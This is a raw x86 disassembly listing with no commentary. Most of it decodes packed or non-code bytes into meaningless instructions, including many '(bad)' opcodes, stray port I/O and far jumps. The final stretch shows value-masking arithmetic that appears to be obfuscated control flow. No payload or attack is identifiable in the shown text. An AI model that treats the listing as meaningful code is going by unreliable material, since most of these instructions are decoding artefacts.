  41f1fa:	cwde   
  41f1fb:	xlat   BYTE PTR ds:[ebx]
  41f1fc:	loopne 0x41f273
  41f1fe:	je     0x41f1a5
  41f200:	fdiv   QWORD PTR gs:[ecx+0x584f306a]
  41f207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f208:	fcom   DWORD PTR [ecx]
  41f20a:	dec    edx
  41f20b:	mov    ch,0x8a
  41f20d:	xor    esp,esi
  41f20f:	(bad)  
  41f210:	and    al,0x56
  41f212:	nop
  41f213:	dec    ebx
  41f214:	xor    BYTE PTR [ebp-0x772701fd],al
  41f21a:	lods   al,BYTE PTR ds:[esi]
  41f21b:	adc    al,0xd7
  41f21d:	sub    BYTE PTR [edi+0x3e01a456],bh
  41f223:	dec    ebp
  41f224:	jo     0x41f2a3
  41f226:	push   edi
  41f227:	in     al,dx
  41f228:	(bad)  [esi-0x6e]
  41f22b:	sub    DWORD PTR [ebx],edx
  41f22d:	shr    DWORD PTR [edi+ecx*2-0x21],1
  41f231:	sub    eax,0x6b38eb2
  41f236:	in     al,0x16
  41f238:	lock xor ch,BYTE PTR [ebx-0x5e]
  41f23c:	cmp    BYTE PTR [edx],dh
  41f23e:	jo     0x41f1df
  41f240:	and    DWORD PTR fs:[ecx+0x6114e39b],ebx
  41f247:	dec    esi
  41f248:	call   0x5ced:0xa3805a4f
  41f24f:	sbb    eax,0x6429c4ed
  41f254:	pop    ebp
  41f255:	jne    0x41f25f
  41f257:	push   ebp
  41f258:	cdq    
  41f259:	sub    DWORD PTR [eax],eax
  41f25b:	arpl   ax,ax
  41f25d:	ret    
  41f25e:	jl     0x41f21f
  41f260:	xchg   edx,eax
  41f261:	jns    0x41f240
  41f263:	jae    0x41f21e
  41f265:	jle    0x41f297
  41f267:	cld    
  41f268:	push   esi
  41f269:	mov    ebx,0x1d90f90f
  41f26e:	lds    ecx,FWORD PTR [edx-0x4bf40b49]
  41f274:	ret    
  41f275:	out    0xe,al
  41f277:	fbstp  TBYTE PTR [edx+0x6f92fe08]
  41f27d:	mov    esi,0x79cc1888
  41f282:	mov    ds:0x37f88159,eax
  41f287:	rol    DWORD PTR [ebp-0x52fb7541],cl
  41f28d:	in     al,dx
  41f28e:	and    ecx,ebp
  41f290:	mov    al,0x75
  41f292:	scas   al,BYTE PTR es:[edi]
  41f293:	dec    ecx
  41f294:	stos   DWORD PTR es:[edi],eax
  41f295:	pop    ebx
  41f296:	mov    al,ds:0x98653908
  41f29b:	cdq    
  41f29c:	inc    edx
  41f29d:	xlat   BYTE PTR ds:[ebx]
  41f29e:	dec    eax
  41f29f:	idiv   BYTE PTR ds:0x38654380
  41f2a5:	std    
  41f2a6:	jns    0x41f249
  41f2a8:	sub    eax,0x958245a6
  41f2ad:	call   0x5ffa:0xd2ee2a39
  41f2b4:	popf   
  41f2b5:	in     al,0xc5
  41f2b7:	adc    al,0xb9
  41f2b9:	push   0x60ce2009
  41f2be:	jg     0x41f288
  41f2c0:	xchg   esi,eax
  41f2c1:	mov    edi,0x6683a2d8
  41f2c6:	dec    edx
  41f2c7:	push   cs
  41f2c8:	pop    ds
  41f2c9:	dec    esi
  41f2ca:	es jns 0x41f333
  41f2cd:	dec    eax
  41f2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2cf:	outs   dx,BYTE PTR ds:[esi]
  41f2d0:	rcl    DWORD PTR [eax+0x6d],0xae
  41f2d4:	out    dx,eax
  41f2d5:	or     BYTE PTR [esi+0x7b5397f0],cl
  41f2db:	pusha  
  41f2dc:	or     DWORD PTR [edi+esi*1-0x54173c63],esi
  41f2e3:	fs out 0x36,al
  41f2e6:	inc    eax
  41f2e7:	repnz retfw 0x915
  41f2ec:	add    edi,DWORD PTR [edx+ebp*8-0x6032cfb8]
  41f2f3:	add    ch,BYTE PTR [eax-0x63]
  41f2f6:	sbb    ch,BYTE PTR [ecx-0x424e008d]
  41f2fc:	adc    edi,DWORD PTR ds:0xabda6bcb
  41f302:	mov    esi,0x1209b384
  41f307:	mov    eax,0xdc31b804
  41f30c:	(bad)  
  41f30e:	push   0x6594c0b2
  41f313:	or     BYTE PTR [esi+eax*8],cl
  41f316:	push   esi
  41f317:	jnp    0x41f389
  41f319:	mov    eax,ds:0xde5629df
  41f31e:	adc    BYTE PTR [ecx-0x25],0x64
  41f322:	fadd   st(3),st
  41f324:	mov    ebx,0xeab73d22
  41f329:	cmc    
  41f32a:	push   0xffffffb3
  41f32c:	lahf   
  41f32d:	push   edi
  41f32e:	add    BYTE PTR [ebx],ah
  41f330:	in     eax,0x9c
  41f332:	mov    edx,DWORD PTR [eax]
  41f334:	fs jno 0x41f37c
  41f337:	and    DWORD PTR [ecx-0x3ed6a3f8],ebx
  41f33d:	pop    esi
  41f33e:	sub    ch,cl
  41f340:	mov    esi,0x8072ecf2
  41f345:	in     al,dx
  41f346:	dec    esp
  41f347:	fprem1 
  41f349:	and    al,0xbb
  41f34b:	dec    ecx
  41f34c:	mov    ecx,0x2437f2bb
  41f351:	add    BYTE PTR [ebp+0x6a],dh
  41f354:	fwait
  41f355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f356:	dec    ecx
  41f357:	jb     0x41f32a
  41f359:	push   ecx
  41f35a:	in     eax,dx
  41f35b:	cs dec ecx
  41f35d:	adc    ecx,esp
  41f35f:	push   ebx
  41f360:	frstor [eax]
  41f362:	add    ah,0x2b
  41f365:	imul   esp,DWORD PTR [edx-0x1d608191],0x376e291
  41f36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f370:	ss fwait
  41f372:	bound  esp,QWORD PTR [ebp+0x8]
  41f375:	adc    BYTE PTR [ebp-0x33],ah
  41f378:	fisubr DWORD PTR [esi+0x58]
  41f37b:	cmp    bh,BYTE PTR [ecx]
  41f37d:	outs   dx,BYTE PTR ds:[esi]
  41f37e:	gs cmp edi,0x7d3643cb
  41f385:	clc    
  41f386:	jle    0x41f394
  41f388:	inc    eax
  41f389:	push   es
  41f38a:	dec    esp
  41f38b:	xor    bh,BYTE PTR [ebx-0x4404582f]
  41f391:	inc    ebp
  41f392:	sub    al,0x22
  41f394:	cmc    
  41f395:	int3   
  41f396:	daa    
  41f397:	cmc    
  41f398:	outs   dx,DWORD PTR ds:[esi]
  41f399:	dec    ebx
  41f39a:	mov    ebx,0x87f11ea7
  41f39f:	lods   al,BYTE PTR ds:[esi]
  41f3a0:	into   
  41f3a1:	pop    esp
  41f3a2:	jecxz  0x41f37f
  41f3a4:	inc    ebx
  41f3a5:	(bad)  
  41f3a6:	aad    0xc6
  41f3a8:	jmp    0x41f419
  41f3aa:	xor    BYTE PTR [eax+0x50ef1ce7],cl
  41f3b0:	jl     0x41f34b
  41f3b2:	test   al,0x9c
  41f3b4:	sub    ch,dh
  41f3b6:	lds    eax,FWORD PTR [esi-0x6f]
  41f3b9:	jecxz  0x41f400
  41f3bb:	xor    BYTE PTR [ebx],dl
  41f3bd:	es arpl dx,si
  41f3c0:	jne    0x41f3c2
  41f3c2:	cmc    
  41f3c3:	call   0x5c39:0xe449ed26
  41f3ca:	rep ins DWORD PTR es:[edi],dx
  41f3cc:	cli    
  41f3cd:	lock jle 0x41f439
  41f3d0:	test   al,0x91
  41f3d2:	lods   eax,DWORD PTR ds:[esi]
  41f3d3:	out    dx,al
  41f3d4:	jno    0x41f3b4
  41f3d6:	cmc    
  41f3d7:	xchg   esp,eax
  41f3d8:	push   es
  41f3d9:	sbb    dl,BYTE PTR [edx+0x734474eb]
  41f3df:	rcl    BYTE PTR [edi+0x14],cl
  41f3e2:	xor    BYTE PTR [ebx],ah
  41f3e4:	js     0x41f43b
  41f3e6:	add    DWORD PTR [esi-0x46],esi
  41f3e9:	adc    DWORD PTR [esi-0x2a81a179],esp
  41f3ef:	fcom   DWORD PTR [esi]
  41f3f1:	cmp    ah,BYTE PTR [ecx+0x43]
  41f3f4:	or     DWORD PTR [edi],edi
  41f3f6:	sub    al,dh
  41f3f8:	call   0x1abb1447
  41f3fd:	dec    eax
  41f3fe:	mov    ah,0x9c
  41f400:	sbb    eax,0xa1597db
  41f405:	sub    al,0xe4
  41f407:	jb     0x41f3a3
  41f409:	sbb    al,0x2b
  41f40b:	dec    ecx
  41f40c:	stos   BYTE PTR es:[edi],al
  41f40d:	cmp    DWORD PTR [edx-0x37],0xa857aa63
  41f414:	test   DWORD PTR [ecx+0x7c],esi
  41f417:	xchg   edi,eax
  41f418:	adc    al,0x11
  41f41a:	mov    edx,0xcb4a3220
  41f41f:	jnp    0x41f45c
  41f421:	push   cs
  41f422:	lods   al,BYTE PTR ds:[esi]
  41f423:	sbb    al,0xce
  41f425:	in     al,dx
  41f426:	cmpps  xmm4,XMMWORD PTR [ebp+0x42],0xe3
  41f42b:	test   BYTE PTR [edi+edx*4-0x25ba2781],al
  41f432:	jbe    0x41f495
  41f434:	push   ds
  41f435:	lea    edi,[ecx-0x12]
  41f438:	jns    0x41f3f6
  41f43a:	mov    esi,0x989ad7ee
  41f43f:	int3   
  41f440:	sub    DWORD PTR [eax-0x4ef643f6],edi
  41f446:	aad    0x60
  41f448:	add    BYTE PTR [esi-0x1b],0xb0
  41f44c:	pop    eax
  41f44d:	cmc    
  41f44e:	das    
  41f44f:	scas   eax,DWORD PTR es:[edi]
  41f450:	popf   
  41f451:	push   edx
  41f452:	xchg   edi,eax
  41f453:	test   eax,0x7096e20f
  41f458:	ss xchg ch,ah
  41f45b:	xchg   edi,eax
  41f45c:	cdq    
  41f45d:	mov    dh,0xd0
  41f45f:	inc    esp
  41f460:	cmp    bl,BYTE PTR [esi]
  41f462:	rol    bl,1
  41f464:	shl    DWORD PTR [eax-0x3be35da7],cl
  41f46a:	push   ebp
  41f46b:	xchg   esi,eax
  41f46c:	mov    esi,0x80656505
  41f471:	mov    DWORD PTR [ebx-0x3f45c86f],0xb5bbe81c
  41f47b:	lds    esp,FWORD PTR [ecx]
  41f47d:	nop
  41f47e:	data16 mov al,0x6f
  41f481:	imul   ecx,DWORD PTR [edx+edx*1+0x7a],0xe
  41f486:	repnz les edx,FWORD PTR [edx-0x3b]
  41f48a:	addr16 push edx
  41f48c:	jae    0x41f451
  41f48e:	mov    ?,ebp
  41f490:	(bad)  
  41f491:	or     eax,0xe3f4d8eb
  41f496:	(bad)  
  41f497:	(bad)  
  41f498:	xchg   esi,eax
  41f499:	lods   al,BYTE PTR ds:[esi]
  41f49a:	push   edi
  41f49b:	ds and eax,0x6e8c0107
  41f4a1:	stc    
  41f4a2:	ins    DWORD PTR es:[edi],dx
  41f4a3:	jmp    0x41f4d0
  41f4a5:	adc    BYTE PTR [edi-0x12],dl
  41f4a8:	das    
  41f4a9:	ds jge 0x41f443
  41f4ac:	lea    ebx,[esi-0x6ecb1e27]
  41f4b2:	cmp    DWORD PTR es:[ecx-0x1a],ebx
  41f4b6:	sbb    dh,BYTE PTR [ebp-0x57f89a83]
  41f4bc:	push   esi
  41f4bd:	and    DWORD PTR [ecx],esi
  41f4bf:	shl    DWORD PTR ds:0x53db2d46,cl
  41f4c5:	mov    ebx,0x4e2e1941
  41f4ca:	jnp    0x41f51f
  41f4cc:	inc    esi
  41f4cd:	inc    esp
  41f4ce:	sub    al,0x4
  41f4d0:	jnp    0x41f47a
  41f4d2:	inc    ebp
  41f4d3:	cmp    al,0xd7
  41f4d5:	cwde   
  41f4d6:	sti    
  41f4d7:	mul    BYTE PTR [ebp-0x2737cdcf]
  41f4dd:	jecxz  0x41f47d
  41f4df:	cmp    esp,DWORD PTR [ebx+0x5b]
  41f4e2:	cmp    BYTE PTR [edx+0x20],cl
  41f4e5:	xchg   ebp,eax
  41f4e6:	jnp    0x41f496
  41f4e8:	not    BYTE PTR [eax]
  41f4ea:	inc    edx
  41f4eb:	and    al,0x15
  41f4ed:	mov    cl,0xd5
  41f4ef:	cdq    
  41f4f0:	scas   al,BYTE PTR es:[edi]
  41f4f1:	adc    dl,ch
  41f4f3:	imul   ecx,DWORD PTR [ecx-0x478e1e83],0xffffff83
  41f4fa:	adc    ch,cl
  41f4fc:	fs push 0xffffff81
  41f4ff:	mov    al,0x4
  41f501:	adc    al,0xb3
  41f503:	fild   WORD PTR [ebp-0x68d022ac]
  41f509:	or     eax,esi
  41f50b:	add    ah,BYTE PTR [edx+0x7fb26dab]
  41f511:	ins    DWORD PTR es:[edi],dx
  41f512:	(bad)  
  41f513:	mov    edi,0x8294ac0a
  41f518:	cmp    BYTE PTR [ebx],bl
  41f51a:	pop    ebp
  41f51b:	cld    
  41f51c:	popf   
  41f51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f51e:	sub    DWORD PTR [ebp-0x21fe3913],ecx
  41f524:	jmp    0xc449:0x8bfe
  41f52a:	lock jne 0x41f513
  41f52d:	mov    edx,0x97cd9cda
  41f532:	mov    BYTE PTR [eax+0x35],0xe9
  41f536:	shr    BYTE PTR [edi+ecx*2],1
  41f539:	repz mov al,BYTE PTR [eax]
  41f53c:	aad    0x8
  41f53e:	jno    0x41f4e0
  41f540:	pop    ss
  41f541:	int3   
  41f542:	push   esi
  41f543:	outs   dx,BYTE PTR ds:[esi]
  41f544:	jmp    0x41f4e2
  41f546:	push   esi
  41f547:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f549:	call   0x3c438466
  41f54e:	or     esp,DWORD PTR [eax-0x4c9cb5f4]
  41f554:	lods   eax,DWORD PTR ds:[esi]
  41f555:	pop    edi
  41f556:	cmp    edi,DWORD PTR [edi+0x4c935e07]
  41f55c:	mov    dh,0x69
  41f55e:	fnstenv [ecx]
  41f560:	in     eax,dx
  41f561:	lahf   
  41f562:	pushf  
  41f563:	dec    ecx
  41f564:	(bad)  
  41f565:	xor    bl,ah
  41f567:	mov    bl,0x58
  41f569:	test   ebp,ebx
  41f56b:	into   
  41f56c:	inc    edx
  41f56d:	pushf  
  41f56e:	sub    BYTE PTR [eax+0x45],dl
  41f571:	mov    edi,0xcf521409
  41f576:	sub    DWORD PTR [ecx],edi
  41f578:	cmp    DWORD PTR [esi+0x6536f54],ebx
  41f57e:	and    dl,BYTE PTR [ebx]
  41f580:	jge    0x41f568
  41f582:	mov    eax,DWORD PTR [ebx+0x9]
  41f585:	das    
  41f586:	fsubr  QWORD PTR [edi-0x52]
  41f589:	jae    0x41f5f8
  41f58b:	lock js 0x41f5b5
  41f58e:	jae    0x41f528
  41f590:	mov    eax,ds:0xcecfb5bc
  41f595:	shl    eax,0x6f
  41f598:	pop    ebx
  41f599:	cmp    eax,0x1944d00e
  41f59e:	or     dh,bh
  41f5a0:	cs push cs
  41f5a2:	inc    ebx
  41f5a3:	test   BYTE PTR [edi+edx*8],dl
  41f5a6:	lds    ebp,FWORD PTR [ecx+0x48]
  41f5a9:	ins    BYTE PTR es:[edi],dx
  41f5aa:	jecxz  0x41f573
  41f5ac:	jmp    0x39865508
  41f5b1:	sub    eax,0x75c6e89a
  41f5b6:	scas   al,BYTE PTR es:[edi]
  41f5b7:	jmp    0x3b80:0xc7e4dce3
  41f5be:	push   cs
  41f5bf:	or     ah,BYTE PTR [ebx-0x2d719c6e]
  41f5c5:	fdivr  DWORD PTR [ecx-0x7e739003]
  41f5cb:	and    ch,BYTE PTR [edx-0x211760a9]
  41f5d1:	imul   ecx,DWORD PTR [ebp-0x5c],0xffffffef
  41f5d5:	dec    ecx
  41f5d6:	shl    DWORD PTR [eax+0x7d],1
  41f5d9:	sub    ecx,0xffffffda
  41f5dc:	xchg   ebp,eax
  41f5dd:	ds sahf 
  41f5df:	aam    0x60
  41f5e1:	scas   eax,DWORD PTR es:[edi]
  41f5e2:	out    dx,al
  41f5e3:	sub    DWORD PTR [eax-0x28],0x96885cf8
  41f5ea:	pop    esi
  41f5eb:	mov    ebx,0x32d3126a
  41f5f0:	arpl   WORD PTR [esi+0x13bb355c],bx
  41f5f6:	mov    edi,0xde3a3851
  41f5fb:	xchg   edx,eax
  41f5fc:	xor    al,0xc9
  41f5fe:	(bad)  
  41f5ff:	ret    0x473e
  41f602:	dec    ecx
  41f603:	(bad)  fs:[ebx-0x44]
  41f607:	in     eax,dx
  41f608:	xor    DWORD PTR [ebx+edi*4+0x46],esi
  41f60c:	push   0xffffffce
  41f60e:	rol    BYTE PTR [ebp+0x2b],cl
  41f611:	jl     0x41f5ef
  41f613:	push   cs
  41f614:	pop    ds
  41f615:	ins    DWORD PTR es:[edi],dx
  41f616:	rcpps  xmm1,XMMWORD PTR [edi+0x5569f554]
  41f61d:	mov    cs,WORD PTR [edi+0x52bc4666]
  41f623:	mov    ah,0xa4
  41f625:	push   0xffffffe8
  41f627:	mov    edx,DWORD PTR [edi-0x5cd62ceb]
  41f62d:	jge    0x41f64d
  41f62f:	xor    BYTE PTR [edi+0x4507139c],bl
  41f635:	adc    BYTE PTR ds:0x312b165e,dl
  41f63b:	arpl   WORD PTR cs:[ebx],ax
  41f63e:	ins    BYTE PTR es:[edi],dx
  41f63f:	sbb    BYTE PTR [ecx-0x4cac2eef],0xd2
  41f646:	jp     0x41f64c
  41f648:	ror    DWORD PTR [edi+0x73],1
  41f64b:	mov    WORD PTR [ebx-0x50adecf2],fs
  41f651:	jne    0x41f6c8
  41f653:	sbb    BYTE PTR [edi+0x47],bh
  41f656:	aad    0x42
  41f658:	pop    es
  41f659:	lahf   
  41f65a:	fstp   QWORD PTR [edi]
  41f65c:	(bad)  
  41f65d:	mov    cl,0xc6
  41f65f:	inc    edx
  41f660:	shl    BYTE PTR [esi+0x4e],0x41
  41f664:	inc    ebx
  41f665:	jecxz  0x41f5eb
  41f667:	jl     0x41f684
  41f669:	(bad)  
  41f66a:	mov    ds:0xb5709a6c,eax
  41f66f:	xor    edi,esi
  41f671:	mov    edx,ebx
  41f673:	(bad)  
  41f674:	frstor [edi-0x4a]
  41f677:	xchg   ecx,eax
  41f678:	adc    ch,0x75
  41f67b:	je     0x41f61a
  41f67d:	jno    0x41f66a
  41f67f:	lock pop esi
  41f681:	in     eax,0xbe
  41f683:	cld    
  41f684:	call   0x529a:0xa371bb7f
  41f68b:	(bad)  
  41f68c:	shl    esi,cl
  41f68e:	loopne 0x41f6d6
  41f690:	hlt    
  41f691:	iret   
  41f692:	cdq    
  41f693:	popf   
  41f694:	xchg   DWORD PTR [esi-0x58],ecx
  41f697:	jl     0x41f693
  41f699:	adc    al,0x61
  41f69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f69c:	lahf   
  41f69d:	pop    ebx
  41f69e:	jg     0x41f673
  41f6a0:	pop    ecx
  41f6a1:	int3   
  41f6a2:	jg     0x41f68e
  41f6a4:	ja     0x41f674
  41f6a6:	das    
  41f6a7:	xchg   esp,eax
  41f6a8:	inc    edx
  41f6a9:	fdiv   QWORD PTR [edi+0x29]
  41f6ac:	in     eax,dx
  41f6ad:	fstp   DWORD PTR [ecx-0x6037d066]
  41f6b3:	push   esi
  41f6b4:	cmp    ebx,eax
  41f6b6:	ret    0x393c
  41f6b9:	inc    eax
  41f6ba:	fisttp QWORD PTR [edx+edx*8]
  41f6bd:	or     esp,DWORD PTR [ebp-0x76]
  41f6c0:	ins    BYTE PTR es:[edi],dx
  41f6c1:	jg     0x41f6a6
  41f6c3:	add    dh,bl
  41f6c5:	retf   0x3fd1
  41f6c8:	fsub   QWORD PTR [ebp-0x6]
  41f6cb:	push   dx
  41f6cd:	fcom   DWORD PTR [ebx-0x5b]
  41f6d0:	stos   BYTE PTR es:[edi],al
  41f6d1:	jge    0x41f715
  41f6d3:	fs mov ebx,0x4d2d3161
  41f6d9:	ficomp DWORD PTR [edx]
  41f6db:	ss adc al,0x4f
  41f6de:	sbb    ebx,esp
  41f6e0:	adc    cl,BYTE PTR [edi+ebp*4+0xe938ae]
  41f6e7:	push   ss
  41f6e8:	mov    edx,?
  41f6ea:	sbb    DWORD PTR [edi],0xfffffffd
  41f6ed:	fdivrp st(2),st
  41f6ef:	mov    dh,0x41
  41f6f1:	bound  edx,QWORD PTR [ebx+0x59c38c76]
  41f6f7:	test   al,0xb9
  41f6f9:	lahf   
  41f6fa:	pop    ebp
  41f6fb:	mov    cl,0xd2
  41f6fd:	and    DWORD PTR [eax],edi
  41f6ff:	cmc    
  41f700:	xor    al,BYTE PTR [esi-0x513fdc1b]
  41f706:	cmp    al,0x18
  41f708:	mov    DWORD PTR [eax-0x4c],edx
  41f70b:	scas   al,BYTE PTR es:[edi]
  41f70c:	mov    bl,0x49
  41f70e:	push   ss
  41f70f:	scas   eax,DWORD PTR es:[edi]
  41f710:	jg     0x41f785
  41f712:	jb     0x41f700
  41f714:	out    dx,al
  41f715:	fadd   QWORD PTR [ebp+0x35ec43d6]
  41f71b:	sub    eax,esi
  41f71d:	imul   esi
  41f71f:	xchg   BYTE PTR [edi],dl
  41f721:	dec    BYTE PTR [edi]
  41f723:	or     bh,BYTE PTR [eax]
  41f725:	mov    ds:0xa4fcc59,al
  41f72a:	jnp    0x41f7a4
  41f72c:	bound  esp,QWORD PTR [edi+0x1e]
  41f72f:	mov    al,ds:0x94cc220e
  41f734:	pop    ebp
  41f735:	mov    ch,0x1d
  41f737:	les    ebx,FWORD PTR [ebp-0x61ab60b1]
  41f73d:	push   0xffffffd2
  41f73f:	test   ch,al
  41f741:	dec    ebx
  41f742:	ins    DWORD PTR es:[edi],dx
  41f743:	test   DWORD PTR [eax-0x51],esp
  41f746:	xchg   DWORD PTR [ecx],ebx
  41f748:	inc    esi
  41f749:	rol    BYTE PTR [eax+ebp*2+0x0],0xc4
  41f74e:	in     eax,0xe0
  41f750:	jbe    0x41f77f
  41f752:	xchg   ebx,eax
  41f753:	fisttp WORD PTR [edx-0x65]
  41f756:	sub    DWORD PTR [eax],ebp
  41f758:	cmp    ch,ch
  41f75a:	cmp    BYTE PTR [edx-0x10],bl
  41f75d:	jmp    0x5506:0xe4dc02d2
  41f764:	sbb    ecx,esi
  41f766:	je     0x41f720
  41f768:	popa   
  41f769:	xchg   ebp,eax
  41f76a:	pop    ebx
  41f76b:	sub    eax,0x57551ad7
  41f770:	mov    cs,WORD PTR [ebx]
  41f772:	mov    ds:0x5858a92,al
  41f777:	loop   0x41f739
  41f779:	mov    dh,0xc9
  41f77b:	mov    ds:0x3c78f3c8,al
  41f780:	inc    ebx
  41f781:	cmp    ax,0x6b0e
  41f785:	in     eax,dx
  41f786:	push   ebp
  41f787:	cli    
  41f788:	jle    0x41f7c3
  41f78a:	mov    bh,0x9b
  41f78c:	aas    
  41f78d:	loopne 0x41f7b5
  41f78f:	jns    0x41f7ea
  41f791:	mov    dh,0x1d
  41f793:	fidivr WORD PTR [edi]
  41f795:	xchg   edi,eax
  41f796:	jp     0x41f72a
  41f798:	int    0x3b
  41f79a:	mov    ecx,0xfc3311bc
  41f79f:	mov    WORD PTR [edi-0x4b7bf4e4],ss
  41f7a5:	nop
  41f7a6:	leave  
  41f7a7:	pop    edi
  41f7a8:	outs   dx,BYTE PTR ds:[esi]
  41f7a9:	adc    eax,DWORD PTR [edx]
  41f7ab:	jmp    0x1566:0x8a7d0c47
  41f7b2:	xchg   esi,eax
  41f7b3:	sbb    bl,BYTE PTR [ecx-0x1d]
  41f7b6:	and    bl,dh
  41f7b8:	mov    al,0xcb
  41f7ba:	call   0x90fd0609
  41f7bf:	iret   
  41f7c0:	pop    edi
  41f7c1:	fstp   TBYTE PTR [edi+0x1fd39d0c]
  41f7c7:	push   ecx
  41f7c8:	cmp    DWORD PTR [edi+0x629bad8b],ebp
  41f7ce:	(bad)  
  41f7d0:	int    0xc5
  41f7d2:	jg     0x41f7fc
  41f7d4:	or     eax,0xea26034c
  41f7d9:	pop    edi
  41f7da:	mov    dh,0x90
  41f7dc:	xor    ch,BYTE PTR [eax]
  41f7de:	retf   
  41f7df:	test   BYTE PTR [ecx],dh
  41f7e1:	cmp    al,0xad
  41f7e3:	aam    0xa4
  41f7e5:	adc    dl,dl
  41f7e7:	out    dx,al
  41f7e8:	push   ebp
  41f7e9:	push   0x464b18f9
  41f7ee:	(bad)  
  41f7ef:	jp     0x41f78f
  41f7f1:	jge    0x41f820
  41f7f3:	xor    DWORD PTR [edx],esi
  41f7f5:	mov    bh,0x88
  41f7f7:	sub    bh,bl
  41f7f9:	loop   0x41f7cd
  41f7fb:	push   ebp
  41f7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7fd:	mov    al,ds:0x8b432b64
  41f802:	mov    eax,ds:0x49b7c861
  41f807:	xchg   ebx,eax
  41f808:	in     al,dx
  41f809:	das    
  41f80a:	imul   ebp,DWORD PTR [esi-0x7554ea1f],0x49e32f82
  41f814:	lea    edi,[ebx-0x74]
  41f817:	mov    ds:0x8ebcc021,al
  41f81c:	xchg   BYTE PTR [ebp-0x16],dl
  41f81f:	bound  eax,QWORD PTR [ebx]
  41f821:	pop    ds
  41f822:	out    dx,al
  41f823:	les    esi,FWORD PTR [esp+esi*4-0x4e12d028]
  41f82a:	push   0xffffffb9
  41f82c:	idiv   DWORD PTR [ebx+edx*1]
  41f82f:	leave  
  41f830:	xchg   ebp,eax
  41f831:	dec    esi
  41f832:	xchg   esp,eax
  41f833:	jno    0x41f882
  41f835:	inc    BYTE PTR [ebx+0x34aaf16c]
  41f83b:	adc    eax,0xf298e5ba
  41f840:	cmp    BYTE PTR [edx+0x4e],dl
  41f843:	mov    edx,DWORD PTR [edx-0x41c4ba6a]
  41f849:	add    DWORD PTR [esi-0x2b],ebp
  41f84c:	dec    ecx
  41f84d:	xor    eax,0xb9940f36
  41f852:	pop    es
  41f853:	sbb    dl,BYTE PTR [eax]
  41f855:	inc    esp
  41f856:	leave  
  41f857:	test   al,0x5d
  41f859:	aaa    
  41f85a:	(bad)  
  41f85b:	(bad)  
  41f85e:	pop    eax
  41f85f:	sub    al,0xdc
  41f861:	and    esp,DWORD PTR [eax+0x59cc8fbe]
  41f867:	pushf  
  41f868:	nop
  41f869:	inc    edx
  41f86a:	sub    al,0x46
  41f86c:	out    0x67,al
  41f86e:	loop   0x41f86a
  41f870:	jnp    0x41f84e
  41f872:	ss daa 
  41f874:	mov    edi,0xcf62f9a8
  41f879:	push   cs
  41f87a:	sbb    BYTE PTR [edx],bl
  41f87c:	fldenv [eax]
  41f87e:	mov    dh,0x45
  41f880:	test   al,0x21
  41f883:	push   es
  41f884:	add    DWORD PTR ds:0xde83f1fa,0xb3a0e1c6
  41f88e:	jno    0x41f8d4
  41f890:	xor    al,0x8
  41f892:	(bad)  
  41f893:	es dec edx
  41f895:	or     dl,BYTE PTR [edx+0x1730ced5]
  41f89b:	mov    edi,0x4f7e7f18
  41f8a0:	popa   
  41f8a1:	mov    edx,DWORD PTR [ebp+0x8]
  41f8a4:	mov    ebx,DWORD PTR [ebp-0x50]
  41f8a7:	add    edx,ecx
  41f8a9:	xor    edx,ebx
  41f8ab:	mov    DWORD PTR [ebp-0x50],edx
  41f8ae:	mov    edx,DWORD PTR [ebp+0x8]
  41f8b1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f8b4:	add    edx,edi
  41f8b6:	and    edx,ebx
  41f8b8:	mov    DWORD PTR [ebp-0x4c],edx
  41f8bb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8be:	mov    ebx,DWORD PTR [ebp-0x48]
  41f8c1:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f8c8:	mov    DWORD PTR [ebp-0x48],edx
  41f8cb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8ce:	mov    ebx,0xfa5e1524
  41f8d3:	sub    ebx,edx
  41f8d5:	add    ebx,DWORD PTR [ebp-0x44]
  41f8d8:	mov    DWORD PTR [ebp-0x44],ebx
  41f8db:	mov    edx,DWORD PTR [ebp+0x8]
  41f8de:	xor    edx,eax
  41f8e0:	add    edx,esi
  41f8e2:	jne    0x41d4a1
  41f8e8:	mov    edx,DWORD PTR [ebp-0xc]
  41f8eb:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f8f2:	mov    bl,BYTE PTR [ebp-0x1]
  41f8f5:	cmp    dl,bl
  41f8f7:	je     0x41f9d5
  41f8fd:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f900:	mov    edx,DWORD PTR [ebp-0xc]
  41f903:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f90a:	mov    ebx,DWORD PTR [ebp+0xc]
  41f90d:	xor    ecx,eax
  41f90f:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  41f916:	jne    0x421e61
  41f91c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f91f:	mov    edx,DWORD PTR [ebp+0xc]
  41f922:	xor    ecx,eax
  41f924:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  41f92c:	mov    edx,DWORD PTR [ebp-0x18]
  41f92f:	xor    edx,eax
  41f931:	add    edx,esi
  41f933:	cmp    ecx,edx
  41f935:	mov    ecx,DWORD PTR [ebp-0x14]
  41f938:	mov    DWORD PTR [ebp+0x8],ecx
  41f93b:	mov    ecx,DWORD PTR [ebp+0x8]
  41f93e:	je     0x4230ce
  41f944:	xor    ecx,eax
  41f946:	add    ecx,esi
  41f948:	mov    ecx,0x242ebc9
  41f94d:	je     0x41fa5d
  41f953:	mov    edx,DWORD PTR [ebp+0x8]
  41f956:	mov    ebx,DWORD PTR [ebp-0x8]
  41f959:	xor    edx,eax
  41f95b:	xor    ebx,eax
  41f95d:	sub    edx,ebx
  41f95f:	sub    edx,esi
  41f961:	xor    edx,eax
  41f963:	mov    DWORD PTR [ebp+0x8],edx
  41f966:	mov    edx,DWORD PTR [ebp+0x8]
  41f969:	mov    ebx,DWORD PTR [ebp-0x58]
  41f96c:	add    edx,0x5708fa
  41f972:	imul   edx,ebx
